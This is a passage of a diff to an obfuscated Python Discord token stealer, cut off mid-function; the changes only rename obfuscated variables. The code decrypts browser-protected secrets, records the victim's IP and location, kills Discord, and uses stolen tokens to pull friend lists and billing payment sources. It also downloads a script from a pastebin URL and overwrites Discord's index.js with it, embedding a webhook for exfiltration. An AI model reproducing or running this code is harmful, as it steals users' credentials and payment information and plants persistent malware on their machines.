@@ -25,12 +25,12 @@ IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOio
 inj_url_raaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ="https://pastebin.com/raw/BsZ18N9J"#line:26
 DETECTED =False #line:28
 def g3t1p ():#line:30
-    O0OO0OOO0O000OO0O ="None"#line:31
+    OOOO0O000OO000000 ="None"#line:31
     try :#line:32
-        O0OO0OOO0O000OO0O =urlopen (Request ("https://api.ipify.org")).read ().decode ().strip ()#line:33
+        OOOO0O000OO000000 =urlopen (Request ("https://api.ipify.org")).read ().decode ().strip ()#line:33
     except :#line:34
         pass #line:35
-    return O0OO0OOO0O000OO0O #line:36
+    return OOOO0O000OO000000 #line:36
 requirements =[["requests","requests"],["Crypto.Cipher","pycryptodome"],]#line:41
 for modl in requirements :#line:42
     try :__import__ (modl [0 ])#line:43
@@ -45,505 +45,505 @@ temp =os .getenv ("TEMP")#line:53
 Threadlist =[]#line:54
 class DATA_BLOB (Structure ):#line:57
     _fields_ =[('cbData',wintypes .DWORD ),('pbData',POINTER (c_char ))]#line:61
-def G3tD4t4 (OO0000O0O00OOOOOO ):#line:63
-    O00OO0OOOO00O00OO =int (OO0000O0O00OOOOOO .cbData )#line:64
-    O0000O000O00O00OO =OO0000O0O00OOOOOO .pbData #line:65
-    OO0O0OOOO0OO0O000 =c_buffer (O00OO0OOOO00O00OO )#line:66
-    cdll .msvcrt .memcpy (OO0O0OOOO0OO0O000 ,O0000O000O00O00OO ,O00OO0OOOO00O00OO )#line:67
-    windll .kernel32 .LocalFree (O0000O000O00O00OO )#line:68
-    return OO0O0OOOO0OO0O000 .raw #line:69
-def CryptUnprotectData (O00O0O0OO0OOOO0OO ,entropy =b''):#line:71
-    O00O0O0O000O0OO0O =c_buffer (O00O0O0OO0OOOO0OO ,len (O00O0O0OO0OOOO0OO ))#line:72
-    O000OOO0O0OOO000O =c_buffer (entropy ,len (entropy ))#line:73
-    OOO0O0000O0O0OOOO =DATA_BLOB (len (O00O0O0OO0OOOO0OO ),O00O0O0O000O0OO0O )#line:74
-    OO0O00O00OOO0OO00 =DATA_BLOB (len (entropy ),O000OOO0O0OOO000O )#line:75
-    O0OOO0000OO00O00O =DATA_BLOB ()#line:76
-    if windll .crypt32 .CryptUnprotectData (byref (OOO0O0000O0O0OOOO ),None ,byref (OO0O00O00OOO0OO00 ),None ,None ,0x01 ,byref (O0OOO0000OO00O00O )):#line:78
-        return G3tD4t4 (O0OOO0000OO00O00O )#line:79
-def D3kryptV4lU3 (OO0OOOOO00O0OO0O0 ,master_key =None ):#line:81
-    OO00O0OOO000O00OO =OO0OOOOO00O0OO0O0 .decode (encoding ='utf8',errors ='ignore')[:3 ]#line:82
-    if OO00O0OOO000O00OO =='v10'or OO00O0OOO000O00OO =='v11':#line:83
-        OO000OOOOO0000OOO =OO0OOOOO00O0OO0O0 [3 :15 ]#line:84
-        OO0OOO000O00OOO00 =OO0OOOOO00O0OO0O0 [15 :]#line:85
-        OOOOOO000OO0OOO0O =AES .new (master_key ,AES .MODE_GCM ,OO000OOOOO0000OOO )#line:86
-        O0000OOO0OOO000O0 =OOOOOO000OO0OOO0O .decrypt (OO0OOO000O00OOO00 )#line:87
-        O0000OOO0OOO000O0 =O0000OOO0OOO000O0 [:-16 ].decode ()#line:88
-        return O0000OOO0OOO000O0 #line:89
-def L04dR3qu3sTs (OO00O0OO00OOO0OOO ,O00O0OOOOOO00O00O ,data ='',files ='',headers =''):#line:91
-    for OOO0O0OOOO0OOO0O0 in range (8 ):#line:92
+def G3tD4t4 (OO0OOOOO00000OOO0 ):#line:63
+    OO00OO00O00O0O000 =int (OO0OOOOO00000OOO0 .cbData )#line:64
+    OOO00000000000000 =OO0OOOOO00000OOO0 .pbData #line:65
+    O00OOO0OO0O000000 =c_buffer (OO00OO00O00O0O000 )#line:66
+    cdll .msvcrt .memcpy (O00OOO0OO0O000000 ,OOO00000000000000 ,OO00OO00O00O0O000 )#line:67
+    windll .kernel32 .LocalFree (OOO00000000000000 )#line:68
+    return O00OOO0OO0O000000 .raw #line:69
+def CryptUnprotectData (OOO0O0OO00OO0O0O0 ,entropy =b''):#line:71
+    OOO000000OO00OO0O =c_buffer (OOO0O0OO00OO0O0O0 ,len (OOO0O0OO00OO0O0O0 ))#line:72
+    O00O0OO0O0OO0000O =c_buffer (entropy ,len (entropy ))#line:73
+    OO00OO00OOOOOOOOO =DATA_BLOB (len (OOO0O0OO00OO0O0O0 ),OOO000000OO00OO0O )#line:74
+    O000OO000O0O00000 =DATA_BLOB (len (entropy ),O00O0OO0O0OO0000O )#line:75
+    O0O0000O0O0000O00 =DATA_BLOB ()#line:76
+    if windll .crypt32 .CryptUnprotectData (byref (OO00OO00OOOOOOOOO ),None ,byref (O000OO000O0O00000 ),None ,None ,0x01 ,byref (O0O0000O0O0000O00 )):#line:78
+        return G3tD4t4 (O0O0000O0O0000O00 )#line:79
+def D3kryptV4lU3 (O0OO0OOO00OOO00O0 ,master_key =None ):#line:81
+    OO000OO0O0OOOOO0O =O0OO0OOO00OOO00O0 .decode (encoding ='utf8',errors ='ignore')[:3 ]#line:82
+    if OO000OO0O0OOOOO0O =='v10'or OO000OO0O0OOOOO0O =='v11':#line:83
+        O00OO00OO0O0O0O0O =O0OO0OOO00OOO00O0 [3 :15 ]#line:84
+        OOO0000O0O00O0OO0 =O0OO0OOO00OOO00O0 [15 :]#line:85
+        O0OO0O0OOOOOO0OOO =AES .new (master_key ,AES .MODE_GCM ,O00OO00OO0O0O0O0O )#line:86
+        OOO0000O0O000000O =O0OO0O0OOOOOO0OOO .decrypt (OOO0000O0O00O0OO0 )#line:87
+        OOO0000O0O000000O =OOO0000O0O000000O [:-16 ].decode ()#line:88
+        return OOO0000O0O000000O #line:89
+def L04dR3qu3sTs (O000O000O0O0O00OO ,OOOO0O00OOOOO0O0O ,data ='',files ='',headers =''):#line:91
+    for OO000OO00OOOO0O0O in range (8 ):#line:92
         try :#line:93
-            if OO00O0OO00OOO0OOO =='POST':#line:94
+            if O000O000O0O0O00OO =='POST':#line:94
                 if data !='':#line:95
-                    OO0O0000O00O000O0 =requests .post (O00O0OOOOOO00O00O ,data =data )#line:96
-                    if OO0O0000O00O000O0 .status_code ==200 :#line:97
-                        return OO0O0000O00O000O0 #line:98
+                    OO00O0O0O0O0O00O0 =requests .post (OOOO0O00OOOOO0O0O ,data =data )#line:96
+                    if OO00O0O0O0O0O00O0 .status_code ==200 :#line:97
+                        return OO00O0O0O0O0O00O0 #line:98
                 elif files !='':#line:99
-                    OO0O0000O00O000O0 =requests .post (O00O0OOOOOO00O00O ,files =files )#line:100
-                    if OO0O0000O00O000O0 .status_code ==200 or OO0O0000O00O000O0 .status_code ==413 :#line:101
-                        return OO0O0000O00O000O0 #line:102
+                    OO00O0O0O0O0O00O0 =requests .post (OOOO0O00OOOOO0O0O ,files =files )#line:100
+                    if OO00O0O0O0O0O00O0 .status_code ==200 or OO00O0O0O0O0O00O0 .status_code ==413 :#line:101
+                        return OO00O0O0O0O0O00O0 #line:102
         except :#line:103
             pass #line:104
-def L04durl1b (O0O0O0O0O0O0000O0 ,data ='',files ='',headers =''):#line:106
-    for OOOO00OOOO0OOOOO0 in range (8 ):#line:107
+def L04durl1b (OOOOO00O00OO00OOO ,data ='',files ='',headers =''):#line:106
+    for OOO0OO000OO0OOOO0 in range (8 ):#line:107
         try :#line:108
             if headers !='':#line:109
-                O00O0OOO0O0O00OOO =urlopen (Request (O0O0O0O0O0O0000O0 ,data =data ,headers =headers ))#line:110
-                return O00O0OOO0O0O00OOO #line:111
+                O00OO0O0OOOOO0OOO =urlopen (Request (OOOOO00O00OO00OOO ,data =data ,headers =headers ))#line:110
+                return O00OO0O0OOOOO0OOO #line:111
             else :#line:112
-                O00O0OOO0O0O00OOO =urlopen (Request (O0O0O0O0O0O0000O0 ,data =data ))#line:113
-                return O00O0OOO0O0O00OOO #line:114
+                O00OO0O0OOOOO0OOO =urlopen (Request (OOOOO00O00OO00OOO ,data =data ))#line:113
+                return O00OO0O0OOOOO0OOO #line:114
         except :#line:115
             pass #line:116
 def globalInfo ():#line:118
-    O0O000O00OOOOO0O0 =g3t1p ()#line:119
-    O0O000OOO0OOOO00O =os .getenv ("USERNAME")#line:120
-    O0OOOOO0O0O0O0O0O =urlopen (Request (f"https://geolocation-db.com/jsonp/{O0O000O00OOOOO0O0}")).read ().decode ().replace ('callback(','').replace ('})','}')#line:121
-    OOOO00O00OOO0O0O0 =loads (O0OOOOO0O0O0O0O0O )#line:122
-    O0OOOO0OOO0O0O0O0 =OOOO00O00OOO0O0O0 ["country_name"]#line:123
-    O00OOOO00OOO0O00O =OOOO00O00OOO0O0O0 ["country_code"].lower ()#line:124
-    O0O0OOO0O00O0OOO0 =OOOO00O00OOO0O0O0 ["state"]#line:125
-    OO0O00OO0OOO0O0OO =f":flag_{O00OOOO00OOO0O00O}:  - `{O0O000OOO0OOOO00O.upper()} | {O0O000O00OOOOO0O0} ({O0OOOO0OOO0O0O0O0})`"#line:127
-    return OO0O00OO0OOO0O0OO #line:128
-def TR6st (O00000OO00OOO0OO0 ):#line:131
+    O0OO0OO0O00000000 =g3t1p ()#line:119
+    O00000O0O0OOO0OOO =os .getenv ("USERNAME")#line:120
+    OO0OOO0O00OO00O00 =urlopen (Request (f"https://geolocation-db.com/jsonp/{O0OO0OO0O00000000}")).read ().decode ().replace ('callback(','').replace ('})','}')#line:121
+    O0O0O0O00000O0O0O =loads (OO0OOO0O00OO00O00 )#line:122
+    O000OO00O0OOOO00O =O0O0O0O00000O0O0O ["country_name"]#line:123
+    OO000000O0OOO00O0 =O0O0O0O00000O0O0O ["country_code"].lower ()#line:124
+    O0O0O0OO0OO00OOO0 =O0O0O0O00000O0O0O ["state"]#line:125
+    OO000O00OO000000O =f":flag_{OO000000O0OOO00O0}:  - `{O00000O0O0OOO0OOO.upper()} | {O0OO0OO0O00000000} ({O000OO00O0OOOO00O})`"#line:127
+    return OO000O00OO000000O #line:128
+def TR6st (O0OO000OOOO000000 ):#line:131
     global DETECTED #line:132
-    O0OOO0OOO00OOO0OO =str (O00000OO00OOO0OO0 )#line:133
-    OOOO00OOOO0OO00O0 =re .findall (".google.com",O0OOO0OOO00OOO0OO )#line:134
-    if len (OOOO00OOOO0OO00O0 )<-1 :#line:135
+    O000OOOOOO0OO0O00 =str (O0OO000OOOO000000 )#line:133
+    O000O0000OOO0OO00 =re .findall (".google.com",O000OOOOOO0OO0O00 )#line:134
+    if len (O000O0000OOO0OO00 )<-1 :#line:135
         DETECTED =True #line:136
         return DETECTED #line:137
     else :#line:138
         DETECTED =False #line:139
         return DETECTED #line:140
-def G3tUHQFr13ndS (OOOOOO0O0O0OO0O00 ):#line:142
-    OO0000O0000OO0OO0 =[{"Name":'Early_Verified_Bot_Developer','Value':131072 ,'Emoji':"<:developer:874750808472825986> "},{"Name":'Bug_Hunter_Level_2','Value':16384 ,'Emoji':"<:bughunter_2:874750808430874664> "},{"Name":'Early_Supporter','Value':512 ,'Emoji':"<:early_supporter:874750808414113823> "},{"Name":'House_Balance','Value':256 ,'Emoji':"<:balance:874750808267292683> "},{"Name":'House_Brilliance','Value':128 ,'Emoji':"<:brilliance:874750808338608199> "},{"Name":'House_Bravery','Value':64 ,'Emoji':"<:bravery:874750808388952075> "},{"Name":'Bug_Hunter_Level_1','Value':8 ,'Emoji':"<:bughunter_1:874750808426692658> "},{"Name":'HypeSquad_Events','Value':4 ,'Emoji':"<:hypesquad_events:874750808594477056> "},{"Name":'Partnered_Server_Owner','Value':2 ,'Emoji':"<:partner:874750808678354964> "},{"Name":'Discord_Employee','Value':1 ,'Emoji':"<:staff:874750808728666152> "}]#line:154
-    OO0O0O00OO0OOOOOO ={"Authorization":OOOOOO0O0O0OO0O00 ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:159
+def G3tUHQFr13ndS (OOOOO0OOOOOO0O0O0 ):#line:142
+    O0O0O0OO0OO0OOO0O =[{"Name":'Early_Verified_Bot_Developer','Value':131072 ,'Emoji':"<:developer:874750808472825986> "},{"Name":'Bug_Hunter_Level_2','Value':16384 ,'Emoji':"<:bughunter_2:874750808430874664> "},{"Name":'Early_Supporter','Value':512 ,'Emoji':"<:early_supporter:874750808414113823> "},{"Name":'House_Balance','Value':256 ,'Emoji':"<:balance:874750808267292683> "},{"Name":'House_Brilliance','Value':128 ,'Emoji':"<:brilliance:874750808338608199> "},{"Name":'House_Bravery','Value':64 ,'Emoji':"<:bravery:874750808388952075> "},{"Name":'Bug_Hunter_Level_1','Value':8 ,'Emoji':"<:bughunter_1:874750808426692658> "},{"Name":'HypeSquad_Events','Value':4 ,'Emoji':"<:hypesquad_events:874750808594477056> "},{"Name":'Partnered_Server_Owner','Value':2 ,'Emoji':"<:partner:874750808678354964> "},{"Name":'Discord_Employee','Value':1 ,'Emoji':"<:staff:874750808728666152> "}]#line:154
+    OO00O0O00O0O0OO00 ={"Authorization":OOOOO0OOOOOO0O0O0 ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:159
     try :#line:160
-        OO000O0OO00O0OOOO =loads (urlopen (Request ("https://discord.com/api/v6/users/@me/relationships",headers =OO0O0O00OO0OOOOOO )).read ().decode ())#line:161
+        OO00OOO00O00OOO0O =loads (urlopen (Request ("https://discord.com/api/v6/users/@me/relationships",headers =OO00O0O00O0O0OO00 )).read ().decode ())#line:161
     except :#line:162
         return False #line:163
-    OOOOOOOO00OOOOO00 =''#line:165
-    for O0OO00O00OO00OOO0 in OO000O0OO00O0OOOO :#line:166
-        OOO00OOOOOOO0000O =''#line:167
-        OOOOO000O00O0O00O =O0OO00O00OO00OOO0 ['user']['public_flags']#line:168
-        for O0OO0OO0O0000000O in OO0000O0000OO0OO0 :#line:169
-            if OOOOO000O00O0O00O //O0OO0OO0O0000000O ["Value"]!=0 and O0OO00O00OO00OOO0 ['type']==1 :#line:170
-                if not "House"in O0OO0OO0O0000000O ["Name"]:#line:171
-                    OOO00OOOOOOO0000O +=O0OO0OO0O0000000O ["Emoji"]#line:172
-                OOOOO000O00O0O00O =OOOOO000O00O0O00O %O0OO0OO0O0000000O ["Value"]#line:173
-        if OOO00OOOOOOO0000O !='':#line:174
-            OOOOOOOO00OOOOO00 +=f"{OOO00OOOOOOO0000O} | {O0OO00O00OO00OOO0['user']['username']}#{O0OO00O00OO00OOO0['user']['discriminator']} ({O0OO00O00OO00OOO0['user']['id']})\n"#line:175
-    return OOOOOOOO00OOOOO00 #line:176
+    O00OOOOO00O0OO00O =''#line:165
+    for OO0O00O00OO00O000 in OO00OOO00O00OOO0O :#line:166
+        O000OO0O00000OOOO =''#line:167
+        O00OO0O0O000O0000 =OO0O00O00OO00O000 ['user']['public_flags']#line:168
+        for OO00000OO000000O0 in O0O0O0OO0OO0OOO0O :#line:169
+            if O00OO0O0O000O0000 //OO00000OO000000O0 ["Value"]!=0 and OO0O00O00OO00O000 ['type']==1 :#line:170
+                if not "House"in OO00000OO000000O0 ["Name"]:#line:171
+                    O000OO0O00000OOOO +=OO00000OO000000O0 ["Emoji"]#line:172
+                O00OO0O0O000O0000 =O00OO0O0O000O0000 %OO00000OO000000O0 ["Value"]#line:173
+        if O000OO0O00000OOOO !='':#line:174
+            O00OOOOO00O0OO00O +=f"{O000OO0O00000OOOO} | {OO0O00O00OO00O000['user']['username']}#{OO0O00O00OO00O000['user']['discriminator']} ({OO0O00O00OO00O000['user']['id']})\n"#line:175
+    return O00OOOOO00O0OO00O #line:176
 process_list =os .popen ('tasklist').readlines ()#line:179
 for process in process_list :#line:182
     if "Discord"in process :#line:183
         pid =int (process .split ()[1 ])#line:185
         os .system (f"taskkill /F /PID {pid}")#line:186
-def G3tb1ll1ng (O000O00OOOOOO0OOO ):#line:188
-    O0OO0O00O0O0O00O0 ={"Authorization":O000O00OOOOOO0OOO ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:193
+def G3tb1ll1ng (O00OO0OOO0O0OO000 ):#line:188
+    OOO000O0O0OOO0OO0 ={"Authorization":O00OO0OOO0O0OO000 ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:193
     try :#line:194
-        O0O00OOO00O0000O0 =loads (urlopen (Request ("https://discord.com/api/users/@me/billing/payment-sources",headers =O0OO0O00O0O0O00O0 )).read ().decode ())#line:195
+        O0O0O0OO0OO0OOOO0 =loads (urlopen (Request ("https://discord.com/api/users/@me/billing/payment-sources",headers =OOO000O0O0OOO0OO0 )).read ().decode ())#line:195
     except :#line:196
         return False #line:197
-    if O0O00OOO00O0000O0 ==[]:return "```None```"#line:199
-    OO000O00OO0O00OOO =""#line:201
-    for O0O000OOO0OO00O00 in O0O00OOO00O0000O0 :#line:202
-        if O0O000OOO0OO00O00 ["invalid"]==False :#line:203
-            if O0O000OOO0OO00O00 ["type"]==1 :#line:204
-                OO000O00OO0O00OOO +=":credit_card:"#line:205
-            elif O0O000OOO0OO00O00 ["type"]==2 :#line:206
-                OO000O00OO0O00OOO +=":parking: "#line:207
-    return OO000O00OO0O00OOO #line:209
+    if O0O0O0OO0OO0OOOO0 ==[]:return "```None```"#line:199
+    O0OO0OOOOO0000000 =""#line:201
+    for OO00OO000O0O0000O in O0O0O0OO0OO0OOOO0 :#line:202
+        if OO00OO000O0O0000O ["invalid"]==False :#line:203
+            if OO00OO000O0O0000O ["type"]==1 :#line:204
+                O0OO0OOOOO0000000 +=":credit_card:"#line:205
+            elif OO00OO000O0O0000O ["type"]==2 :#line:206
+                O0OO0OOOOO0000000 +=":parking: "#line:207
+    return O0OO0OOOOO0000000 #line:209
 def keywork ():#line:212
-    O000OOO0O00O0O0O0 =os .getlogin ()#line:214
-    O00O000000O00000O =['Discord','DiscordCanary','DiscordPTB','DiscordDevelopment']#line:216
-    for OOOO00OOO00O0OO0O in O00O000000O00000O :#line:218
-        O00OOO00O0OO0000O =os .path .join (os .getenv ('LOCALAPPDATA'),OOOO00OOO00O0OO0O )#line:219
-        if os .path .isdir (O00OOO00O0OO0000O ):#line:220
-            for O0O0O0O000OOOOO00 ,O000OOOOO0O0O00OO ,OOOO00OO0O0000OO0 in os .walk (O00OOO00O0OO0000O ):#line:221
-                if 'app-'in O0O0O0O000OOOOO00 :#line:222
-                    for OO000OOO00O00O0OO in O000OOOOO0O0O00OO :#line:223
-                        if 'modules'in OO000OOO00O00O0OO :#line:224
-                            O0O000O0OOO0O0O0O =os .path .join (O0O0O0O000OOOOO00 ,OO000OOO00O00O0OO )#line:225
-                            for OOOOOOO0OO000OOOO ,O0OO0O0O000000O0O ,OO000OO00OO000OO0 in os .walk (O0O000O0OOO0O0O0O ):#line:226
-                                if 'discord_desktop_core-'in OOOOOOO0OO000OOOO :#line:227
-                                    for OOOOOOOO0000O00OO ,OOO0O000O0O0O0O00 ,OO00O0OO0OO0O0OO0 in os .walk (OOOOOOO0OO000OOOO ):#line:228
-                                        if 'discord_desktop_core'in OOOOOOOO0000O00OO :#line:229
-                                            for O000OOOOOOOO0OOOO in OO00O0OO0OO0O0OO0 :#line:230
-                                                if O000OOOOOOOO0OOOO =='index.js':#line:231
-                                                    OO0OO00O00OO00OOO =os .path .join (OOOOOOOO0000O00OO ,O000OOOOOOOO0OOOO )#line:232
-                                                    O0O0O0OOOO0OOO0OO =requests .get (inj_url_raaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ).text #line:234
-                                                    O0O0O0OOOO0OOO0OO =O0O0O0OOOO0OOO0OO .replace ("%WEBHOOK%",IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO )#line:236
-                                                    with open (OO0OO00O00OO00OOO ,"w",encoding ="utf-8")as OOO00OO0O000O00O0 :#line:238
-                                                        OOO00OO0O000O00O0 .write (O0O0O0OOOO0OOO0OO )#line:239
+    O0OOO0OOOO0OOO000 =os .getlogin ()#line:214
+    OOOOOO000O0O0OOOO =['Discord','DiscordCanary','DiscordPTB','DiscordDevelopment']#line:216
+    for OO00OOO0OOOO00O0O in OOOOOO000O0O0OOOO :#line:218
+        O0OO0OO0O0O0OOO00 =os .path .join (os .getenv ('LOCALAPPDATA'),OO00OOO0OOOO00O0O )#line:219
+        if os .path .isdir (O0OO0OO0O0O0OOO00 ):#line:220
+            for O000O0O0O000O000O ,OOO000O0000O0OOOO ,OO0OOOO0O00O00O0O in os .walk (O0OO0OO0O0O0OOO00 ):#line:221
+                if 'app-'in O000O0O0O000O000O :#line:222
+                    for O000OO0O0O000OOOO in OOO000O0000O0OOOO :#line:223
+                        if 'modules'in O000OO0O0O000OOOO :#line:224
+                            O000O00O0OO0O0OOO =os .path .join (O000O0O0O000O000O ,O000OO0O0O000OOOO )#line:225
+                            for O0000O0O0O0OO0O00 ,O0O0OO0OO0O0000OO ,OO00OO0OOO0O0OOO0 in os .walk (O000O00O0OO0O0OOO ):#line:226
+                                if 'discord_desktop_core-'in O0000O0O0O0OO0O00 :#line:227
